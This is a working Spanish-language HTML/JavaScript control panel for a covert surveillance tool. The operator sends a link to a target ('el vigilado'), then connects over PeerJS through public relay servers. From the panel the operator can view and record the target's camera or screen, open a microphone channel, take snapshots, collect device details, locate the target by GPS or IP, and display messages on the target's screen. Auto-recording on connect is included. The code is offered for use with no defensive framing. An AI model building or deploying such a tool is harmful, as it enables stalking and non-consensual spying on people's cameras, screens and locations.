<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Panel · vigilancia</title>
<style>
*{box-sizing:border-box}
:root{--bg:#0f1115;--fg:#e8eaed;--mut:#8b93a1;--bd:#262b35;--card:#171a21;--acc:#22c55e}
body{margin:0;background:var(--bg);color:var(--fg);font:14px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}
.wrap{max-width:820px;margin:0 auto;padding:20px 16px 50px}
h1{font-size:17px;font-weight:500;margin:0 0 3px}
.sub{color:var(--mut);font-size:12px;margin-bottom:18px}
.card{background:var(--card);border:1px solid var(--bd);border-radius:12px;padding:14px;margin-bottom:12px}
.row{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
button{font:inherit;font-size:13px;font-weight:500;padding:9px 13px;border-radius:9px;border:1px solid #2f3644;background:#20242e;color:var(--fg);cursor:pointer}
button:hover{background:#262b36}
button.pri{background:var(--acc);border-color:var(--acc);color:#06180d}
button.on{background:#ef4444;border-color:#ef4444;color:#fff}
input{font:inherit;font-size:13px;padding:9px 11px;border-radius:9px;border:1px solid #2f3644;background:#0f1115;color:var(--fg);width:100%}
.link{font:11.5px/1.45 ui-monospace,Menlo,monospace;color:var(--acc);word-break:break-all}
.dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#6b7280;margin-right:7px;vertical-align:middle}
.dot.live{background:var(--acc);animation:p 1.4s infinite}
@keyframes p{50%{opacity:.3}}
video{width:100%;border-radius:11px;background:#000;display:block}
h3{font-size:11px;font-weight:500;color:var(--mut);margin:0 0 9px;text-transform:uppercase;letter-spacing:.6px}
.dl{display:grid;grid-template-columns:auto 1fr;gap:5px 13px;font-size:12.5px;margin:0}
.dl dt{color:var(--mut)}.dl dd{margin:0;word-break:break-word}
a{color:var(--acc)}
.aviso{position:fixed;left:50%;bottom:22px;transform:translateX(-50%);background:#0f766e;color:#fff;padding:10px 20px;border-radius:999px;font-size:13px;z-index:9}
.log{font:11.5px/1.6 ui-monospace,Menlo,monospace;color:var(--mut);max-height:130px;overflow:auto}
label.chk{display:flex;align-items:center;gap:7px;font-size:12.5px;color:var(--mut);cursor:pointer}
label.chk input{width:auto}
</style>
</head>
<body>
<div class="wrap">
  <h1>Panel de vigilancia</h1>
  <div class="sub">Se conecta solo y reintenta sin parar. Puedes cerrar esta página cuando quieras y volver.</div>

  <div class="card">
    <div style="margin-bottom:11px"><span class="dot" id="st"></span><span id="stTxt" style="font-size:12px;color:var(--mut)">Iniciando…</span></div>
    <div class="row">
      <input id="ref" style="flex:1;min-width:120px" placeholder="referido">
      <button id="aplicar">Aplicar</button>
    </div>
    <div style="margin-top:13px;font-size:11px;color:var(--mut);text-transform:uppercase;letter-spacing:.6px">Enlace que le mandas</div>
    <div class="link" id="enlace" style="margin-top:4px"></div>
    <div class="row" style="margin-top:9px">
      <button id="copiar">Copiar</button>
      <button id="probar">Abrir yo</button>
    </div>
  </div>

  <div id="live" style="display:none">
    <div class="card">
      <video id="vid" autoplay playsinline controls></video>
      <div class="row" style="margin-top:11px">
        <button id="bCam">Cámara</button>
        <button id="bScreen">Pantalla</button>
        <button id="bMic">Hablar</button>
        <button id="bSnap">Foto</button>
        <button id="bRec">Grabar</button>
      </div>
      <div class="row" style="margin-top:7px">
        <input id="msg" style="flex:1;min-width:120px" placeholder="mensaje para su pantalla">
        <button id="bSend">Enviar</button>
        <button id="bInfo">Info</button>
        <button id="bGeo">Ubicación</button>
      </div>
      <div class="row" style="margin-top:9px">
        <label class="chk"><input type="checkbox" id="auto"> grabar automáticamente al conectar</label>
      </div>
    </div>
    <div class="card" id="cInfo" style="display:none"><h3>Dispositivo</h3><dl class="dl" id="lInfo"></dl></div>
    <div class="card" id="cGeo" style="display:none"><h3>Ubicación</h3><div id="bGeoBody"></div></div>
    <div class="card"><h3>Registro</h3><div class="log" id="log"></div></div>
  </div>
</div>

<script src="https://unpkg.com/peerjs@1/dist/peerjs.min.js"></script>
<script>
(function(){
"use strict";
var $ = function(s){ return document.querySelector(s); };

var ICE = { iceServers: [
  { urls:'stun:stun.l.google.com:19302' },
  { urls:'stun:stun1.l.google.com:19302' },
  { urls:'turn:openrelay.metered.ca:80',  username:'openrelayproject', credential:'openrelayproject' },
  { urls:'turn:openrelay.metered.ca:443', username:'openrelayproject', credential:'openrelayproject' }
]};

var REF = (localStorage.getItem('nb_ref') || 'principal');
var ROOM = 'nb-' + REF;
var peer=null, conn=null, call=null, stream=null, micStream=null, mic=false, rec=null, autoRec=false;
var buscando=false, timer=null, to=null;

function estado(live, txt){ $('#st').classList.toggle('live', !!live); $('#stTxt').textContent = txt; }
function enlace(){ return location.origin + location.pathname.replace(/[^/]*$/,'') + '?ref=' + REF; }
function pintarEnlace(){ $('#enlace').textContent = enlace(); }
function log(t){
  var d = document.createElement('div');
  d.textContent = new Date().toLocaleTimeString() + '  ' + t;
  $('#log').prepend(d);
}
function dl(b,n){ var u=URL.createObjectURL(b); var a=document.createElement('a'); a.href=u; a.download=n; a.click(); setTimeout(function(){URL.revokeObjectURL(u);},5000); }

/* ---------- arranque ---------- */
function iniciar(){
  $('#ref').value = REF;
  pintarEnlace();
  peer = new Peer({ config: ICE });
  peer.on('open', function(){ estado(false, 'Buscando al vigilado…'); buscar(); });
  peer.on('error', function(e){ estado(false, 'Error: ' + e.type); log('error ' + e.type); });
  peer.on('disconnected', function(){ try{ peer.reconnect(); }catch(e){} });
}

function buscar(){
  if(buscando || (conn && conn.open)) return;
  buscando = true;
  var c = peer.connect(ROOM, { reliable:true });
  conn = c;

  to = setTimeout(function(){
    if(!c.open){ buscando = false; try{ c.close(); }catch(e){} conn = null; programar(); }
  }, 9000);

  c.on('open', function(){
    clearTimeout(to); buscando = false; clearTimeout(timer);
    estado(true, 'Conectado');
    $('#live').style.display = 'block';
    log('conectado');
    c.send({t:'src', v:'camera'});
  });
  c.on('data', dato);
  c.on('close', function(){ clearTimeout(to); buscando = false; conn = null; cortado(); });
  c.on('error', function(){ clearTimeout(to); buscando = false; conn = null; try{c.close();}catch(e){} programar(); });
}

function programar(){
  clearTimeout(timer);
  timer = setTimeout(function(){ if(!(conn && conn.open)) buscar(); }, 3500);
}

function cortado(){
  estado(false, 'Se desconectó. Reintentando…');
  $('#live').style.display = 'none';
  log('desconectado');
  pararGrabacion();
  programar();
}

function dato(m){
  if(m.t === 'ready'){ llamar(); }
  else if(m.t === 'nada'){ estado(true, 'Permiso de ' + m.v + ' denegado'); log('permiso ' + m.v + ' denegado'); }
  else if(m.t === 'info'){ pintarInfo(m.v); }
  else if(m.t === 'geo'){ pintarGeo(m.v); }
}

function llamar(){
  if(call){ try{ call.close(); }catch(e){} call = null; }
  var salida = (mic && micStream) ? micStream : new MediaStream();
  call = peer.call(ROOM, salida);
  call.on('stream', function(s){
    stream = s;
    $('#vid').srcObject = s;
    if(autoRec && !rec) grabar();
  });
}

/* ---------- controles ---------- */
$('#bCam').onclick = function(){ conn.send({t:'src', v:'camera'}); };
$('#bScreen').onclick = function(){ conn.send({t:'src', v:'screen'}); };
$('#bInfo').onclick = function(){ conn.send({t:'info'}); };
$('#bGeo').onclick = function(){ $('#bGeoBody').textContent = 'Consultando…'; $('#cGeo').style.display='block'; conn.send({t:'geo'}); };
$('#bSend').onclick = function(){ var v = $('#msg').value.trim(); if(v){ conn.send({t:'msg', v}); $('#msg').value=''; } };

$('#bMic').onclick = async function(){
  if(mic){
    mic = false; micStream.getTracks().forEach(function(t){t.stop();}); micStream = null;
    $('#bMic').classList.remove('on');
  } else {
    try{ micStream = await navigator.mediaDevices.getUserMedia({audio:true}); mic = true; $('#bMic').classList.add('on'); }
    catch(e){ return; }
  }
  llamar();
};

$('#bSnap').onclick = function(){
  var v = $('#vid'); if(!v.videoWidth) return;
  var c = document.createElement('canvas'); c.width = v.videoWidth; c.height = v.videoHeight;
  c.getContext('2d').drawImage(v,0,0);
  c.toBlob(function(b){ dl(b, 'captura-' + Date.now() + '.png'); });
};

function grabar(){
  if(rec){ pararGrabacion(); return; }
  if(!stream) return;
  var trozos = [];
  var mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus') ? 'video/webm;codecs=vp9,opus' : 'video/webm';
  rec = new MediaRecorder(stream, {mimeType: mime});
  rec.ondataavailable = function(e){ if(e.data.size) trozos.push(e.data); };
  rec.onstop = function(){
    if(trozos.length) dl(new Blob(trozos,{type:'video/webm'}), 'grabacion-' + Date.now() + '.webm');
    rec = null; $('#bRec').classList.remove('on');
  };
  rec.start(); $('#bRec').classList.add('on'); log('grabando');
}
function pararGrabacion(){ if(rec){ try{ rec.stop(); }catch(e){} } }
$('#bRec').onclick = grabar;
$('#auto').onchange = function(){ autoRec = this.checked; if(autoRec && stream && !rec) grabar(); };

function pintarInfo(v){
  var l = $('#lInfo'); l.innerHTML = '';
  Object.keys(v).forEach(function(k){
    var dt = document.createElement('dt'); dt.textContent = k;
    var dd = document.createElement('dd'); dd.textContent = String(v[k]);
    l.append(dt, dd);
  });
  $('#cInfo').style.display = 'block';
}

function pintarGeo(v){
  var b = $('#bGeoBody');
  $('#cGeo').style.display = 'block';
  if(!v){ b.textContent = 'Sin datos de ubicación.'; return; }
  var t = [ v.src === 'GPS' ? 'Precisión GPS: ±' + Math.round(v.acc) + ' m' : 'Fuente: IP (aproximada)' ];
  if(v.city) t.push(v.city + ', ' + v.region + ', ' + v.country);
  if(v.isp) t.push(v.isp);
  var gm = 'https://www.google.com/maps?q=' + v.lat + ',' + v.lon;
  var om = 'https://www.openstreetmap.org/?mlat=' + v.lat + '&mlon=' + v.lon + '#map=17/' + v.lat + '/' + v.lon;
  b.innerHTML = '<div>' + t.join('<br>') + '</div><div style="margin-top:7px">' + v.lat.toFixed(5) + ', ' + v.lon.toFixed(5) + '</div>'
    + '<div style="margin-top:7px"><a href="' + gm + '" target="_blank">Google Maps</a> · <a href="' + om + '" target="_blank">OpenStreetMap</a></div>';
}

$('#copiar').onclick = function(){
  navigator.clipboard.writeText(enlace());
  $('#copiar').textContent = '¡Copiado!';
  setTimeout(function(){ $('#copiar').textContent = 'Copiar'; }, 1500);
};
$('#probar').onclick = function(){ window.open(enlace(), '_blank'); };

$('#aplicar').onclick = function(){
  var s = $('#ref').value.trim().toLowerCase().replace(/[^a-z0-9-]/g,'');
  if(!s) return;
  REF = s; ROOM = 'nb-' + REF;
  localStorage.setItem('nb_ref', REF);
  pintarEnlace();
  if(conn){ try{ conn.close(); }catch(e){} }
  conn = null; buscando = false; clearTimeout(timer); clearTimeout(to);
  setTimeout(buscar, 500);
};

iniciar();
})();
</script>
</body>
</html>
